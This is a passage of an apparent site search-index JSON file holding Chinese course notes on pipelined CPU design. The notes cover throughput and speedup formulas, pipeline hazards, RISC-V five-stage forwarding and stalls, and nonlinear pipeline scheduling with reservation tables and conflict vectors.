\u8c03\u5ea6\u65b9\u5f0f \u5e73\u5747\u542f\u52a8\u8ddd\u79bb 7 7 1, 7 4 1, 1, 7 3 2, 7 4.5 2, 5 3.5 2, 5, 7 4.67 5 5 5, 2 3.5 5, 7 6 \u6240\u4ee5\u6700\u77ed\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a 3\uff0c\u5bf9\u5e94\u7684\u8c03\u5ea6\u65b9\u5f0f\u4e3a 1\u30011\u30017\u3002","title":"\u6d41\u6c34\u7ebf CPU"},{"location":"cs/system/cs2/topic1/#cpu","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 2 \u81f3 5 \u5468\u8bfe\u7a0b\u5185\u5bb9","title":"\u6d41\u6c34\u7ebf CPU"},{"location":"cs/system/cs2/topic1/#_1","text":"\u5355\u5468\u671f CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u6307\u4ee4\u8fd0\u884c\u65f6\u95f4 \u6d41\u6c34\u7ebf CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u64cd\u4f5c\u65f6\u95f4","title":"\u6548\u7387\u4f30\u6d4b"},{"location":"cs/system/cs2/topic1/#_2","text":"","title":"\u8ba1\u7b97\u6307\u6807"},{"location":"cs/system/cs2/topic1/#_3","text":"\u541e\u5410\u91cf\uff08TP\uff0cThroughput\uff09\uff1a \\(TP = \\dfrac{n}{T}\\) \uff08 \\(n\\) \u8868\u793a\u6307\u4ee4\u6761\u6570\uff0c \\(T\\) \u8868\u793a\u8fd0\u884c\u603b\u65f6\u957f\uff09 \u4e0a\u56fe\u4e2d\u540c\u4e00\u6570\u5b57\u4e3a\u540c\u4e00\u6761\u6307\u4ee4\uff0c\u7eb5\u5750\u6807\u4e3a\u4e0d\u540c\u9636\u6bb5\u7684\u64cd\u4f5c \u8bb0\u6bcf\u6761\u6307\u4ee4\u7684\u9636\u6bb5\u6570\u4e3a \\(m\\) \uff08\u9636\u6570\uff09\u3001\u6bcf\u4e2a\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a \\(\\Delta t_0\\) \uff0c\u5219 \\(T = (m+n-1)\\Delta t_0\\) \uff0c \\(TP = \\dfrac{n}{m+n-1}\\cdot\\dfrac{1}{\\Delta t_0}\\) \u6700\u5927\u541e\u5410\u91cf\uff1a\u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(TP\\) \u8fbe\u5230\u6700\u5927\uff0c\u5373 \\(TP_{\\rm max}=\\dfrac{1}{\\Delta t_0}\\) \u5b9e\u9645\u60c5\u51b5\u4e0b\u5404\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u540c\uff0c\u6700\u957f\u7684\u79f0\u4e3a\u74f6\u9888\u9636\u6bb5\uff08bottleneck segment\uff09 \u8fd9\u79cd\u60c5\u51b5\u4e0b \\(TP\\) \u7684\u8ba1\u7b97\u65b9\u5f0f\u4e0d\u53d8\uff0c \\(TP_{\\rm max}=\\dfrac{1}{\\max(\\Delta t_1, \\Delta t_2, \\cdots, \\Delta t_m)}\\) \u89e3\u51b3\u6d41\u6c34\u7ebf\u74f6\u9888\u7684\u65b9\u6cd5\uff1a \u5c06\u74f6\u9888\u9636\u6bb5\u7ec6\u5206\u4e3a\u53ef\u4ee5\u6d41\u6c34\u7ebf\u64cd\u4f5c\u7684\u66f4\u5c0f\u9636\u6bb5\uff08Subdivision\uff09 \u91cd\u53e0\u6267\u884c\u4e0d\u540c\u6307\u4ee4\u7684\u74f6\u9888\u9636\u6bb5\uff08Repetition\uff09","title":"\u541e\u5410\u91cf"},{"location":"cs/system/cs2/topic1/#_4","text":"\u52a0\u901f\u6bd4\uff08Sp\uff0cSpeedup\uff09\uff1a \\(Sp = \\dfrac{\\text{Execution Time}_\\text{non-pipelined}}{\\text{Execution Time}_\\text{pipelined}}\\) \u540c\u4e0a\u56fe\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 \\(Sp = \\dfrac{n\\cdot m\\cdot\\Delta t_0}{(m+n-1)\\Delta t_0} = \\dfrac{nm}{m+n-1}\\) \u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(Sp=m\\)","title":"\u52a0\u901f\u6bd4"},{"location":"cs/system/cs2/topic1/#_5","text":"\u6548\u7387\uff08 \\(\\eta\\) \uff09\uff1a \\(\\eta = \\dfrac{Sp}{m}\\) \u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(\\eta=1\\)","title":"\u6548\u7387"},{"location":"cs/system/cs2/topic1/#_6","text":"\u6709\u4e09\u79cd\u7c7b\u578b\u7684\u6d41\u6c34\u7ebf\u5192\u9669\uff1a \u7ed3\u6784\u5192\u9669\uff08Structural Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u786c\u4ef6\u7ed3\u6784\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c \u6570\u636e\u5192\u9669\uff08Data Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c \u63a7\u5236\u5192\u9669\uff08Control Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u63a7\u5236\u4fe1\u53f7\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c","title":"\u6d41\u6c34\u7ebf\u5192\u9669"},{"location":"cs/system/cs2/topic1/#_7","text":"\u5bf9\u4e8e\u51af\u8bfa\u4f0a\u66fc\u67b6\u6784\u7684\u8ba1\u7b97\u673a\uff0c\u53ea\u6709\u4e00\u4e2a\u4e3b\u5b58\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u6709\u4e24\u6761\u6307\u4ee4\u7684 IF \u548c MEM \u9636\u6bb5\u4f1a\u4ea7\u751f\u51b2\u7a81\uff08\u5bf9\u4e8e load store \u7c7b\u6307\u4ee4 MEM \u4f1a\u8bbf\u95ee\u4e3b\u5b58\uff09 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u4e3b\u5b58\u8bbf\u95ee\u5b8c\u6210\u540e\u518d\u53d6\u6307 \u6dfb\u52a0\u786c\u4ef6\uff0c\u4f8b\u5982\u6dfb\u52a0\u4e00\u4e2a\u4e3b\u5b58\uff08\u6bd4\u5982\u54c8\u5f17\u67b6\u6784\u5c31\u4e0d\u5b58\u5728\u7ed3\u6784\u5192\u9669\uff09 \u7ed3\u6784\u5192\u9669\u603b\u662f\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0\u989d\u5916\u786c\u4ef6\u6765\u89e3\u51b3","title":"\u7ed3\u6784\u5192\u9669"},{"location":"cs/system/cs2/topic1/#_8","text":"\u6570\u636e\u5192\u9669\u7684\u539f\u56e0\uff1a\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u4f46\u662f\u8be5\u6570\u636e\u5728\u6d41\u6c34\u7ebf\u4e2d\u7684\u4e0d\u540c\u9636\u6bb5\u88ab\u4fee\u6539 \u5982 add x1, x2, x3; sub x4, x1, x5 \u4e24\u6761\u6307\u4ee4\uff0cx1 \u5728 add \u7684 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u5728 WB \u9636\u6bb5\u624d\u4f1a\u88ab\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u800c sub \u7684 ID \u9636\u6bb5\u9700\u8981\u8bbf\u95ee x1\uff0c\u56e0\u6b64\u4ea7\u751f\u6570\u636e\u5192\u9669 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u6570\u636e\u53ef\u7528\uff08\u4f1a\u635f\u5931\u4e24\u4e2a\u65f6\u949f\u5468\u671f\u624d\u7b49\u5230 ID \u5728 WB \u540e\uff09 \u524d\u9012\uff08Forwarding\uff09\uff1a\u5728 ID \u9636\u6bb5\uff0c\u5982\u679c\u9700\u8981\u8bbf\u95ee\u7684\u6570\u636e\u5728 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u4ece EX \u9636\u6bb5\u53d6\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4ece\u5bc4\u5b58\u5668\u6587\u4ef6\u4e2d\u53d6\u6570\u636e \u5e76\u4e0d\u80fd\u5b8c\u5168\u89e3\u51b3\u6570\u636e\u5192\u9669\uff08\u6bd4\u5982 load + add\uff0c\u540e\u4e00\u6761\u7684 EX \u9700\u8981\u524d\u4e00\u6761\u7684 MEM \u7ed3\u679c\uff0c\u800c\u524d\u4e00\u6761 MEM \u8f93\u51fa\u65e0\u6cd5\u63a5\u5230\u540e\u4e00\u6761 EX \u524d\uff09 \u5982\u4e0a\u7684 load-use data hazard \u60c5\u51b5\u4e0b\u6682\u505c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\uff08pipeline stall / bubble\uff09\uff0c\u7b49\u5f85 MEM \u9636\u6bb5\u5b8c\u6210\uff0c\u7136\u540e\u5e94\u7528 forwarding\uff0c\u5c06 MEM \u7ed3\u679c\u76f4\u63a5\u4f20\u5165\u540e\u4e00\u6761\u6307\u4ee4\u7684 EX \u9636\u6bb5 \u901a\u8fc7\u8f6f\u4ef6\u5728\u7f16\u8bd1\u65f6\u907f\u514d\u51fa\u73b0 load-use \u60c5\u51b5","title":"\u6570\u636e\u5192\u9669"},{"location":"cs/system/cs2/topic1/#_9","text":"\u5e38\u53d1\u751f\u5728\u6761\u4ef6\u8df3\u8f6c\uff08\u5206\u652f\uff09\u6307\u4ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u5373 branch \u6307\u4ee4\u540e\u4e0b\u4e00\u6761\u6307\u4ee4\u53ef\u80fd\u4f1a\u53d1\u751f\u8df3\u8f6c\u800c\u4e0d\u662f\u8bfb\u53d6\u7684\u4e0b\u4e00\u6761\u6307\u4ee4 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u5206\u652f\u6761\u4ef6\u8ba1\u7b97\u5b8c\u6210\u5f97\u5230\u4e0b\u4e00\u4e2a PC \u540e\u518d\u5bf9\u4e0b\u4e00\u6761\u6307\u4ee4\u8fdb\u884c\u53d6\u6307 \u53ef\u4ee5\u5c06\u5206\u652f\u5224\u65ad\u63d0\u524d\u5230 ID \u9636\u6bb5\uff08\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e4b\u540e\u5c31\u5224\u65ad\uff09\uff0c\u53ea\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f \u9884\u6d4b\uff08Prediction\uff09\uff1a \u7b80\u5355\u7248\u672c\uff1a\u603b\u662f\u8ba4\u4e3a\u5206\u652f\u4e0d\u4f1a\u53d1\u751f\uff0c\u5373\u603b\u662f\u9884\u6d4b\u4e0d\u53d1\u751f\u8df3\u8f6c\uff0c\u5982\u679c\u53d1\u751f\u8df3\u8f6c\u5219\u63d2\u5165\u4e00\u6761 bubble \u590d\u6742\u7248\u672c\uff1a\u6839\u636e\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b\uff0c\u4f8b\u5982\u4e00\u4e2a\u5faa\u73af\u6700\u540e\u7684\u5206\u652f\u8bed\u53e5\u603b\u662f\u9884\u6d4b\u53d1\u751f\u8df3\u8f6c \u52a8\u6001\u9884\u6d4b\uff1a\u6839\u636e\u5386\u53f2\u8df3\u8f6c\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b \u5ef6\u8fdf\u51b3\u7b56\uff08Delayed Decision\uff09\uff1a\u5c06 branch \u524d\u7684\u65e0\u5173\u6307\u4ee4\u79fb\u52a8\u5230 branch \u4e4b\u540e\u7684 bubble \u5904\uff08\u5206\u652f\u5ef6\u8fdf\u69fd\uff09\u6267\u884c\uff0c\u51cf\u5c11\u4e3a\u4e86\u7b49\u5f85\u800c\u63d2\u5165\u7684\u65e0\u610f\u4e49 bubble \u4ee3\u7801","title":"\u63a7\u5236\u5192\u9669"},{"location":"cs/system/cs2/topic1/#risc-v","text":"RISC-V \u6d41\u6c34\u7ebf\u4e00\u822c\u5305\u542b\u4e94\u4e2a\u9636\u6bb5\uff1a IF (Instruction Fetch)\uff1a\u53d6\u6307\uff0c\u53d6\u51fa I-Mem \u4e2d PC \u5730\u5740\u5904\u7684\u6307\u4ee4 ID (Instruction Decode)\uff1a\u8bd1\u7801\uff0c\u5c06\u6307\u4ee4\u89e3\u7801\u4e3a\u63a7\u5236\u4fe1\u53f7\uff0c\u5e76\u8bfb\u53d6\u5bc4\u5b58\u5668\u503c EX (Execute)\uff1a\u6267\u884c\uff0c\u6267\u884c ALU \u64cd\u4f5c MEM (Memory Access)\uff1a\u8bbf\u5b58\uff0c\u8bbf\u95ee D-Mem \u8fdb\u884c\u5199\u5165\u6216\u8bfb\u53d6 WB (Write Back)\uff1a\u5199\u56de\uff0c\u5c06\u7ed3\u679c\u5199\u56de\u5bc4\u5b58\u5668\u6587\u4ef6 RISC-V ISA \u5bf9\u4e8e\u6d41\u6c34\u7ebf\u7684\u4f18\u70b9\uff1a \u6307\u4ee4\u957f\u5ea6\u56fa\u5b9a\u4e3a 32 \u4f4d\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c\u53d6\u6307\u6216\u8bd1\u7801 \u6307\u4ee4\u683c\u5f0f\u5c11\u4e14\u89c4\u6574\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8bd1\u7801\u3001\u8bfb\u53d6\u5bc4\u5b58\u5668 \u4f7f\u7528 load/store \u5bfb\u5740\u7ed3\u6784\uff0c\u4e00\u4e2a\u5468\u671f\u8ba1\u7b97\u5730\u5740\u3001\u4e00\u4e2a\u5468\u671f\u8bbf\u5b58 \u8bbf\u5b58\u64cd\u4f5c\u90fd\u662f\u5bf9\u9f50\u7684\uff0c\u53ef\u4ee5\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c \u6d41\u6c34\u7ebf\u5b9e\u73b0\uff1a \u6dfb\u52a0\u9636\u6bb5\u5bc4\u5b58\u5668\uff08pipeline register\uff09\u6765\u5206\u9694\u6bcf\u4e2a\u9636\u6bb5\uff1aIF/ID\u3001ID/EX\u3001EX/MEM\u3001MEM/WB \u8fd9\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u5bc4\u5b58\u5668\u4e00\u8d77\u5c06\u6d41\u6c34\u7ebf\u5206\u4e3a\u4e86\u4e94\u4e2a\u90e8\u5206 \u53ef\u4ee5 \u770b\u4f5c \u53ea\u6709\u8fd9\u4e94\u4e2a\u65f6\u5e8f\u7535\u8def\uff0c\u5176\u5b83\u5185\u90e8\u64cd\u4f5c\u90fd\u662f\u7ec4\u5408\u903b\u8f91\uff0c\u5728\u5185\u90e8\u8fd0\u884c \u4e94\u4e2a\u5bc4\u5b58\u5668\u5728\u4e0a\u5347\u6cbf\u8fdb\u884c\u66f4\u65b0\uff0c\u9636\u6bb5\u5bc4\u5b58\u5668\u8fdb\u884c\u6d41\u8f6c\uff0c\u8bb0\u5f55\u5f53\u524d\u6307\u4ee4\u9700\u8981\u7684\u4fe1\u606f \u6570\u636e\u901a\u8def\u4e2d\u6709\u4e24\u4e2a\u56de\u8def MEM \u9636\u6bb5\u8ba1\u7b97\u5206\u652f\u7ed3\u679c\uff0c\u8f93\u51fa\u7ed9 PC\u3002\u53ef\u80fd\u4f1a\u5f15\u8d77\u63a7\u5236\u5192\u9669 WB \u9636\u6bb5\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u6570\u636e\u5192\u9669 ID \u548c WB \u9636\u6bb5\u540c\u65f6\u4f7f\u7528\u5bc4\u5b58\u5668\u7ec4\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u4ea7\u751f\u7ed3\u6784\u5192\u9669\uff0c\u56e0\u4e3a ID \u9636\u6bb5\u53ea\u8bfb\u53d6\u5bc4\u5b58\u5668\uff0cWB \u9636\u6bb5\u53ea\u5199\u5165\u5bc4\u5b58\u5668\uff0c\u76f8\u5f53\u4e8e\u5206\u4e3a\u4e86\u4e24\u4e2a\u90e8\u5206","title":"RISC-V \u6d41\u6c34\u7ebf"},{"location":"cs/system/cs2/topic1/#_10","text":"\u5728 RISC-V \u4e94\u9636\u6d41\u6c34\u7ebf\u4e2d\u5192\u9669\u7684\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u3002","title":"\u5192\u9669\u89e3\u51b3"},{"location":"cs/system/cs2/topic1/#_11","text":"\u5373\u540e\u9762\u7684\u6307\u4ee4\u9700\u8981\u4ece\u5bc4\u5b58\u5668\u7ec4\u4e2d\u8bfb\u53d6\u524d\u9762\u7684\u6307\u4ee4\u5199\u5165\u7684\u7ed3\u679c RISC-V \u6d41\u6c34\u7ebf\u4e2d\u6709\u4e24\u79cd\u60c5\u51b5 use-use hazard\uff1a\u5373\u4e24\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669\uff0c\u53ef\u5206\u4e3a\u51e0\u79cd\u60c5\u51b5\uff1a \u4e24\u6761\u6307\u4ee4\u76f8\u90bb \u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e00\u6761 \u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e24\u6761\uff08\u53ef\u901a\u8fc7\u6539\u8fdb\u5bc4\u5b58\u5668\u7ec4\u89e3\u51b3\uff09 load-use hazard\uff1a\u5373\u4e00\u6761 load \u6307\u4ee4\u548c\u4e00\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669 \u4e0a\u56fe\u662f use-use \u7c7b\u578b\u5192\u9669\u7684\u793a\u610f\u56fe\uff0c\u5176\u4e2d\u7ea2\u8272\u7ebf\u8868\u793a\u6b63\u5e38\u60c5\u51b5\u4e0b\u8bfb\u53d6-\u8bbf\u95ee\u7684\u5173\u7cfb\uff0c\u84dd\u8272\u7ebf\u8868\u793a\u901a\u8fc7\u524d\u9012\u6280\u672f\u89e3\u51b3\u5192\u9669\u65f6\u7684\u8bfb\u53d6-\u8bbf\u95ee\u5173\u7cfb\u3002","title":"\u6570\u636e\u5192\u9669"},{"location":"cs/system/cs2/topic1/#forwarding","text":"\u5373\u5982\u4e0a\u56fe\uff0c\u901a\u8fc7\u6dfb\u52a0\u786c\u4ef6\u8fde\u63a5\u7684\u65b9\u5f0f\u6765\u5c06\u524d\u4e00\u6761\u6307\u4ee4 ALU \u7684\u8f93\u51fa\u76f4\u63a5\u4f20\u9012\u7ed9\u540e\u9762\u6307\u4ee4\u7684 ALU \u8f93\u5165\uff0c\u800c\u5ffd\u7565\u5bc4\u5b58\u5668 \u9700\u8981\u5728\u540e\u4e00\u6761\u51b2\u7a81\u6307\u4ee4\u7684 EX \u9636\u6bb5\u8fdb\u884c\u5224\u65ad\uff0c\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9 ALU \u8f93\u5165\u6765\u6e90\uff08\u539f\u6837\u8fd8\u662f\u5229\u7528\u524d\u9012\u4f20\u9012\u7684\u6570\u636e\uff09","title":"\u524d\u9012\uff08Forwarding\uff09"},{"location":"cs/system/cs2/topic1/#stall","text":"load-use \u60c5\u51b5\u4e0b ALU \u7684\u8f93\u5165\u6765\u81ea\u524d\u4e00\u6761\u6307\u4ee4 Data Memory \u7684\u8f93\u51fa\u800c\u975e\u524d\u9762\u6307\u4ee4\u7684 ALU \u7ed3\u679c\uff0c\u56e0\u6b64\u9700\u8981\u989d\u5916\u7684\u4e00\u6b21 bubble\uff08\u6682\u505c\u4e00\u4e2a\u5468\u671f\uff09 \u63a2\u6d4b\uff0c\u9700\u8981\u63d0\u524d\u5728 ID \u9636\u6bb5\u5c31\u8fdb\u884c\u63a2\u6d4b load-use \u5192\u9669\uff0c\u5982\u679c\u5b58\u5728\u5c31\u6682\u505c\u3001\u63d2\u5165 bubble ID/EX.MemRead == 1 (ID/EX.MemWrite == 0) ID/EX.Rd == IF/ID.Rs1 \u6216 IF/ID.Rs2 \u6682\u505c\u6d41\u6c34\u7ebf \u5f3a\u5236 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u7684\u63a7\u5236\u4fe1\u53f7\u53d8\u4e3a 0\uff08\u76f8\u5f53\u4e8e\u63d2\u5165\u4e00\u6761 nop\uff09 \u963b\u6b62 PC \u5bc4\u5b58\u5668\u548c IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u66f4\u65b0 \u5bf9\u4e8e load-use \u5192\u9669\uff0c\u5728\u6682\u505c\u4e00\u4e2a\u5468\u671f\u540e\u5c31\u53ef\u4ee5\u6309\u7167 MEM hazard \u8fdb\u884c\u524d\u9012\u89e3\u51b3 \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u5728 ID \u9636\u6bb5\u65f6\u68c0\u6d4b\u5230\u5b58\u5728 load-use \u5192\u9669\uff0c\u5728\u6b64\u6682\u505c\uff0c\u7136\u540e\u4e0b\u4e00\u4e2a\u5468\u671f\u7ee7\u7eed\u8fd0\u884c\uff0c\u8fd9\u6837\u4e2d\u95f4\u5c31\u591a\u4e86\u4e00\u6761 bubble\uff0c\u7136\u540e\u5728 EX \u9636\u6bb5\u5c31\u53ef\u4ee5\u6b63\u5e38\u63a5\u6536\u5230 MEM hazard \u7684\u524d\u9012\u503c\u4e86\u3002 \u5177\u4f53\u7684\u786c\u4ef6\u5b9e\u73b0\u548c\u524d\u9762\u7c7b\u4f3c\uff0c\u5728 ID \u9636\u6bb5\u52a0\u4e00\u4e2a Hazard Detection Unit \u6765\u68c0\u6d4b load-use \u5192\u9669\uff0c\u63a5\u6536\u5b83\u9700\u8981\u7684\u503c\uff0c\u8f93\u51fa PCWrite\u3001IF/IDWrite \u63a7\u5236\u4fe1\u53f7\uff08\u65b0\u589e\uff09\u4ee5\u53ca\u4e00\u4e2a\u63a7\u5236\u4fe1\u53f7\u7528\u6765\u9009\u62e9 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u7684\u63a7\u5236\u4fe1\u53f7\u90e8\u5206\u6765\u81ea\u63a7\u5236\u5355\u5143\u8fd8\u662f\u7f6e\u96f6\u3002","title":"\u6682\u505c\uff08Stall\uff09"},{"location":"cs/system/cs2/topic1/#_14","text":"TODO","title":"\u5206\u652f\u5192\u9669"},{"location":"cs/system/cs2/topic1/#_15","text":"\u7ebf\u6027\u6d41\u6c34\u7ebf\u9010\u4e2a\u8fd0\u884c\u6bcf\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u4e2a\u9636\u6bb5\u90fd\u4f1a\u8fd0\u884c\u4e14\u4ec5\u8fd0\u884c\u4e00\u6b21\uff0c\u6ca1\u6709\u53cd\u9988\u548c\u524d\u9988 \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u5b58\u5728\u53cd\u9988\u548c\u524d\u9988\u8fde\u63a5\uff0c\u5176\u4e00\u4e2a\u9636\u6bb5\uff08\u90e8\u4ef6\uff09\u53ef\u80fd\u4f7f\u7528\u4e00\u6b21\u6216\u591a\u6b21 \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4ec5\u901a\u8fc7\u8fde\u63a5\u56fe\u4e0d\u80fd\u591f\u786e\u5b9a\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u987a\u5e8f\uff0c\u4e00\u4e2a\u8fde\u63a5\u56fe\u53ef\u80fd\u5bf9\u5e94\u591a\u4e2a\u4e0d\u540c\u7684\u8fd0\u884c\u987a\u5e8f \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u9700\u8981\u901a\u8fc7\u9884\u7ea6\u8868\uff08reservation table\uff09\u6765\u8868\u793a \u6bcf\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u5217\u8868\u793a\u4e00\u4e2a\u65f6\u949f\u5468\u671f \u6574\u4e2a\u8868\u8868\u793a\u4e00\u4e2a\u4efb\u52a1\u7684\u8fd0\u884c\u6d41\u7a0b\uff0c\u5982\u679c\u5728\u67d0\u4e2a\u5468\u671f\u8fd0\u884c\u67d0\u4e00\u9636\u6bb5\uff0c\u5219\u5728\u5bf9\u5e94\u4f4d\u7f6e\u6253\u4e0a X \u7ebf\u6027\u6d41\u6c34\u7ebf\u4e5f\u6709\u9884\u7ea6\u8868\uff0c\u4e0d\u8fc7\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u4e3a\u4e00\u4e2a\u6b63\u65b9\u5f62\u8868\u683c\uff0c\u5bf9\u89d2\u7ebf\u4e0a\u90fd\u662f X \u5982\u4e0b\u56fe\u5c31\u662f\u4e00\u4e2a\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fde\u63a5\u56fe\uff0c\u548c\u5b83\u7684\u4e00\u4e2a\u9884\u7ea6\u8868\uff1a .md-typeset table:not([class]) th { min-width: 2rem; } 1 2 3 4 5 6 7 S1 X X X S2 X X S3 X X S4 X \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e0d\u80fd\u50cf\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e00\u6837\u76f4\u63a5\u9010\u4e2a\u4efb\u52a1\u8d34\u5728\u4e00\u8d77\u4f9d\u6b21\u8fd0\u884c\uff0c\u56e0\u4e3a\u4f1a\u51fa\u73b0\u51b2\u7a81\uff08\u540c\u4e00\u5468\u671f\u4e0d\u540c\u4efb\u52a1\u4f7f\u7528\u540c\u4e00\u9636\u6bb5\uff0c\u5373\u7ed3\u6784\u5192\u9669\uff09 \u975e\u7ebf\u5f62\u6d41\u6c34\u7ebf\u9700\u8981\u901a\u8fc7\u8c03\u5ea6\u7b97\u6cd5\u6765\u627e\u5230\u6700\u4f18\u7684\u4efb\u52a1\u542f\u52a8\u65b9\u5f0f\uff0c\u4f7f\u5f97\u4efb\u52a1\u95f4\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81\uff0c\u800c\u4e14\u8fd0\u884c\u6700\u9ad8\u6548 \u7b2c\u4e00\u4e2a\u4efb\u52a1\u8fdb\u5165\u6d41\u6c34\u7ebf\u540e\uff0c\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u8fdb\u5165\u4e14\u4e0d\u53d1\u751f\u51b2\u7a81\u7684\u65f6\u95f4\u79f0\u4e3a\u542f\u52a8\u8ddd\u79bb\u3002\u5728\u540c\u4e00\u4e2a\u8c03\u5ea6\u65b9\u5f0f\u4e2d\u542f\u52a8\u8ddd\u79bb\u53ef\u80fd\u4e0d\u540c\uff0c\u6700\u4f73\u7684\u8c03\u5ea6\u65b9\u5f0f\u662f\u4f7f\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u6700\u77ed","title":"\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6"},{"location":"cs/system/cs2/topic1/#_16","text":"\u4e24\u4e2a\u6982\u5ff5\uff1a \u7981\u6b62\u96c6\u5408\uff08prohibit sets\uff09\uff0c\u6307\u9884\u7ea6\u8868\u4e2d\u6bcf\u4e00\u884c\u4efb\u610f\u4e24\u4e2a X \u4e4b\u95f4\u7684\u8ddd\u79bb\u6784\u6210\u7684\u96c6\u5408\u3002\u610f\u4e49\u4e3a\uff1a\u4e24\u4e2a\u4efb\u52a1\u4e4b\u95f4\u7684\u95f4\u9694\u4e0d\u80fd\u662f\u8fd9\u4e2a\u96c6\u5408\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u503c \u51b2\u7a81\u5411\u91cf\uff08conflict vector\uff09\uff0c\u8868\u793a\u4e3a \\((C_m, C_{m-1}, \\cdots, C_2, C_1)\\) \uff0c\u5176\u4e2d \\(m\\) \u4e3a\u7981\u6b62\u96c6\u5408\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5982\u679c \\(i\\) \u5728\u7981\u6b62\u96c6\u5408\u4e2d\uff0c\u5219 \\(C_i=1\\) \u5426\u5219 \\(C_i=0\\) \u5bf9\u4e8e\u4e0a\u9762\u7684\u9884\u7ea6\u8868\uff0c\u7981\u6b62\u96c6\u5408\u4e3a \\(F=\\{3, 4, 6\\}\\) \uff0c\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e3a \\(C=\\mathtt{101100}\\) \u3002 \u56e0\u6b64\u53c2\u8003\u4e8e\u521d\u59cb\u51b2\u7a81\u5411\u91cf\uff0c\u4e0b\u4e00\u4e2a\u4efb\u52a1\u53ea\u53ef\u80fd\u5728\u540e\u7b2c 1\u30012\u30015\u30017 \u4e2a\u5468\u671f\u8fdb\u5165\uff08\u53f3\u6570 1\u30012\u30015 \u4f4d\u4e3a 0\uff0c7 